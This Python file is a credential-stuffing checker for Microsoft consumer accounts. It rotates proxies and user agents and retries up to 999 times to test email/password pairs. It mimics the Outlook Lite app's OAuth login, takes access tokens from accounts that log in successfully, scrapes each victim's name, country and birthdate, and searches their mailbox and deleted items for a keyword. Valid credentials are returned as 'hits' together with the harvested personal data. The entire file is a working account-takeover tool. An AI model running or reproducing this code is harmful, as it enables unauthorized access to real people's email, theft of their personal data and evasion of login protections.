import requests
import uuid
import json
import re
import time
import random
from proxy_manager import proxy_manager

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

PROXY_RETRIES = 999


def generate_user_agent():
    return random.choice(USER_AGENTS)


def checker_worker_single(email: str, password: str, keyword: str, stop_event=None):
    """
    stop_event: threading.Event - ha set() → AZONNAL kilép
    """
    if proxy_manager.get_count() > 0:
        for attempt in range(PROXY_RETRIES):

            # STOP ELLENŐRZÉS MINDEN RETRY ELŐTT
            if stop_event and stop_event.is_set():
                return {"status": "stopped", "reason": "User stopped"}

            proxy_dict = proxy_manager.get_proxy()
            session = requests.Session()
            if proxy_dict:
                session.proxies = proxy_dict

            try:
                result = _do_check(session, email, password, keyword, stop_event)

                if result["status"] == "stopped":
                    return result

                if result["status"] in ("hit", "custom", "bad"):
                    return result

            except Exception:
                pass
            finally:
                session.close()

            # STOP ELLENŐRZÉS RETRY KÖZÖTT
            if stop_event and stop_event.is_set():
                return {"status": "stopped", "reason": "User stopped"}

            time.sleep(0.05)

    return {"status": "error", "reason": "All proxies failed"}


def _do_check(session, email, password, keyword, stop_event=None):
    try:
        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        user_agent = generate_user_agent()

        # ====== STEP 1: GET login page ======
        url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}"
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "return-client-request-id": "false",
            "client-request-id": str(uuid.uuid4()),
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }

        try:
            response = session.get(url, headers=headers, allow_redirects=True, timeout=10)
        except requests.exceptions.RequestException as e:
            return {"status": "error", "reason": f"GET failed: {str(e)[:50]}"}

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        response_text = response.text

        is_microsoft = (
            "PPFT" in response_text
            or "urlPost" in response_text
            or "login.microsoftonline.com" in response_text
            or "login.live.com" in response_text
            or "sFTTag" in response_text
        )

        if not is_microsoft:
            return {"status": "error", "reason": "Not a Microsoft page"}

        # ====== STEP 2: Parse PPFT & urlPost ======
        PPFT = ""
        urlPost = ""

        server_data_pattern = r"var ServerData = ({.*?});"
        server_data_match = re.search(server_data_pattern, response_text, re.DOTALL)

        if server_data_match:
            try:
                server_data_json = server_data_match.group(1)
                server_data = json.loads(server_data_json)
                sFTTag = server_data.get("sFTTag", "")
                if sFTTag:
                    ppft_pattern = r'value="([^"]+)"'
                    ppft_match = re.search(ppft_pattern, sFTTag)
                    if ppft_match:
                        PPFT = ppft_match.group(1)
                urlPost = server_data.get("urlPost", "")
            except json.JSONDecodeError:
                pass

        if not PPFT:
            start_marker = 'name="PPFT" value="'
            start_index = response_text.find(start_marker)
            if start_index != -1:
                start_index += len(start_marker)
                end_index = response_text.find('"', start_index)
                PPFT = response_text[start_index:end_index] if end_index != -1 else ""

        if not urlPost:
            urlpost_pattern = r'"urlPost":"([^"]+)"'
            urlpost_match = re.search(urlpost_pattern, response_text)
            if urlpost_match:
                urlPost = urlpost_match.group(1)

        if not PPFT or not urlPost:
            return {"status": "error", "reason": "No PPFT/urlPost"}

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        # ====== STEP 3: POST credentials ======
        cookies_dict = session.cookies.get_dict()
        MSPRequ = cookies_dict.get("MSPRequ", "")
        uaid_cookie = cookies_dict.get("uaid", "")
        MSPOK = cookies_dict.get("MSPOK", "")
        OParams = cookies_dict.get("OParams", "")
        referer_url = response.url

        data_string = (
            f"i13=1&login={email}&loginfmt={email}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}"
            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}&PPSX=Passport&NewUser=1"
            f"&FoundMSAs=&fspost=0&i21=0"
            f"&CookieDisclosure=0&IsFidoSupported=0"
            f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=3772"
        )

        headers_post = {
            "User-Agent": user_agent,
            "Pragma": "no-cache",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data_string)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": referer_url,
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={MSPRequ}; uaid={uaid_cookie}; MSPOK={MSPOK}; OParams={OParams}",
        }

        try:
            post_response = session.post(
                urlPost,
                data=data_string,
                headers=headers_post,
                allow_redirects=False,
                timeout=10,
            )
        except requests.exceptions.RequestException as e:
            return {"status": "error", "reason": f"POST failed: {str(e)[:50]}"}

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        # ====== STEP 4: Check auth cookie ======
        post_cookies = session.cookies.get_dict()

        if "__Host-MSAAUTHP" not in post_cookies:
            post_text = post_response.text if post_response.text else ""

            is_real_error = (
                "sErrTxt" in post_text
                or "incorrect" in post_text.lower()
                or "error" in post_text.lower()
                or "PPFT" in post_text
                or "urlPost" in post_text
            )

            if is_real_error:
                return {"status": "bad", "reason": "Wrong password"}
            else:
                return {"status": "error", "reason": "No auth cookie, suspicious response"}

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        # ====== STEP 5: Extract auth code ======
        auth_code = ""
        post_text = post_response.text if post_response.text else ""

        if post_response.status_code in [301, 302, 303, 307, 308]:
            redirect_url = post_response.headers.get("Location", "")
            if redirect_url and "msauth://" in redirect_url and "code=" in redirect_url:
                auth_code = redirect_url.split("code=")[1].split("&")[0]
        else:
            redirect_pattern = r"window\.location\s*=\s*[\"']([^\"']+)[\"']"
            redirect_match = re.search(redirect_pattern, post_text)
            if redirect_match:
                redirect_url = redirect_match.group(1)
                if "msauth://" in redirect_url and "code=" in redirect_url:
                    auth_code = redirect_url.split("code=")[1].split("&")[0]

        CID = post_cookies.get("MSPCID", "")
        if CID:
            CID = CID.upper()

        # ====== STEP 6: Get access token ======
        access_token = ""
        if auth_code:
            # STOP CHECK
            if stop_event and stop_event.is_set():
                return {"status": "stopped", "reason": "User stopped"}

            url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data_token = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
            }
            try:
                token_response = requests.post(
                    url_token,
                    data=data_token,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=10,
                )
                if token_response.status_code == 200:
                    token_data = token_response.json()
                    access_token = token_data.get("access_token", "")
            except Exception:
                pass

        if not access_token or not CID:
            return {"status": "error", "reason": "No token after successful auth"}

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        # ====== STEP 7: Profile ======
        Name = ""
        Country = ""
        Birthdate = "N/A"

        profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
        profile_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }

        try:
            pRes = requests.get(profile_url, headers=profile_headers, timeout=8)
            if pRes.status_code == 200:
                profile_data = pRes.json()
                if "accounts" in profile_data and len(profile_data["accounts"]) > 0:
                    first_account = profile_data["accounts"][0]
                    Country = first_account.get("location", "")
                    BD = first_account.get("birthDay", "")
                    BM = first_account.get("birthMonth", "")
                    BY = first_account.get("birthYear", "")
                    if BD and BM and BY:
                        BD_str = str(BD).zfill(2)
                        BM_str = str(BM).zfill(2)
                        Birthdate = f"{BY}-{BM_str}-{BD_str}"
                if "names" in profile_data and len(profile_data["names"]) > 0:
                    first_name = profile_data["names"][0]
                    Name = first_name.get("displayName", "")
        except Exception:
            pass

        # STOP CHECK
        if stop_event and stop_event.is_set():
            return {"status": "stopped", "reason": "User stopped"}

        # ====== STEP 8: Email search ======
        Total = "NO"
        Date = "N/A"

        search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        search_payload = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "United Kingdom Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [
                {
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"},
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 3,
                }
            ],
            "AnswerEntityRequests": [
                {
                    "Query": {"QueryString": keyword},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 100,
                    "EnableAsyncResolution": True,
                }
            ],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification",
                ],
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
        }

        search_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }

        try:
            search_response = requests.post(
                search_url,
                json=search_payload,
                headers=search_headers,
                timeout=8,
            )

            if search_response.status_code == 200:
                search_text = search_response.text

                date_start = search_text.find('"LastModifiedTime":"')
                if date_start != -1:
                    date_start += len('"LastModifiedTime":"')
                    date_end = search_text.find('"', date_start)
                    Date = search_text[date_start:date_end] if date_end != -1 else "N/A"

                total_start = search_text.find('"Total":')
                if total_start != -1:
                    total_start += len('"Total":')
                    total_end = search_text.find(",", total_start)
                    if total_end == -1:
                        total_end = search_text.find("}", total_start)
                    Total = (
                        search_text[total_start:total_end]
                        if total_end != -1
                        else "NO"
                    )
        except Exception:
            pass

        # ====== STEP 9: Return result ======
        if Total != "0" and Total != "NO" and Total != "":
            return {
                "status": "hit",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate,
                    "date": Date,
                    "mails": Total,
                },
            }
        else:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate,
                },
            }

    except requests.exceptions.ProxyError:
        return {"status": "error", "reason": "Proxy error"}
    except requests.exceptions.ConnectTimeout:
        return {"status": "error", "reason": "Connect timeout"}
    except requests.exceptions.ReadTimeout:
        return {"status": "error", "reason": "Read timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "reason": "Connection error"}
    except Exception as e:
        return {"status": "error", "reason": str(e)[:80]}
